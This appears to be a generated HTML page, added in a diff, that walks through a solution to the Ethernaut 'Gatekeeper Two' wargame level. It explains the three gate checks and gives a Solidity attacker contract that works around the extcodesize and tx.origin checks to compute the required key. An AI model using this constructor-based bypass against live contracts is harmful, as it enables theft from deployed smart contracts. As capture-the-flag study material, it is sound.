@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+
+<html>
+<head>
+  <title>Ethernaut 14: Gatekeeper Two</title>
+  <meta http-equiv="content-type" content="text/html; charset=UTF-8">
+  <link rel="stylesheet" media="all" href="../public/stylesheets/normalize.css" />
+  <link rel="stylesheet" media="all" href="../docco.css" />
+</head>
+<body>
+  <div class="container">
+    <div class="page">
+
+      <div class="header">
+        <h1>Ethernaut 14: Gatekeeper Two</h1>
+
+        
+      </div>
+      
+        
+        <p>The three gates of <code>Gatekeeper Two</code>:</p>
+<ol>
+<li><code>msg.sender</code> must not be <code>tx.origin</code> (as in <code>Telephone</code>).</li>
+<li>The attacker contract’s <code>extcodesize</code> must be zero. This is achieved by not having any
+code apart from the constructor, which goes into the deployment bytecode and does not
+count towards <code>extcodesize</code>.</li>
+<li>The first 8 bytes of the keccak hash of <code>msg.sender</code> (= the attacker contract’s address)
+must be equal to the bitwise inverse of the key.</li>
+</ol>
+
+        <div class='highlight'><pre><span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">solidity</span> ^0.6.0;</span>
+
+<span class="hljs-keyword">import</span> <span class="hljs-string">&quot;./14_GatekeeperTwo.sol&quot;</span>;
+
+<span class="hljs-keyword">import</span> <span class="hljs-string">&quot;hardhat/console.sol&quot;</span>;
+
+<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">GatekeeperTwoAttack</span> </span>{
+    <span class="hljs-function"><span class="hljs-keyword">constructor</span> (<span class="hljs-params"><span class="hljs-keyword">address</span> instanceAddr</span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{
+        GatekeeperTwo instance = GatekeeperTwo(instanceAddr);
+
+        <span class="hljs-keyword">bytes32</span> _hash = <span class="hljs-built_in">keccak256</span>(<span class="hljs-built_in">abi</span>.<span class="hljs-built_in">encodePacked</span>(<span class="hljs-keyword">address</span>(<span class="hljs-built_in">this</span>)));
+        <span class="hljs-keyword">uint64</span> ukey = ~<span class="hljs-keyword">uint64</span>(<span class="hljs-keyword">bytes8</span>(_hash));
+        <span class="hljs-keyword">bytes8</span> key = <span class="hljs-keyword">bytes8</span>(ukey);
+
+        instance.enter(key);
+    }
+}</pre></div>
+      
+    </div>
+  </div>
+</body>
+</html>
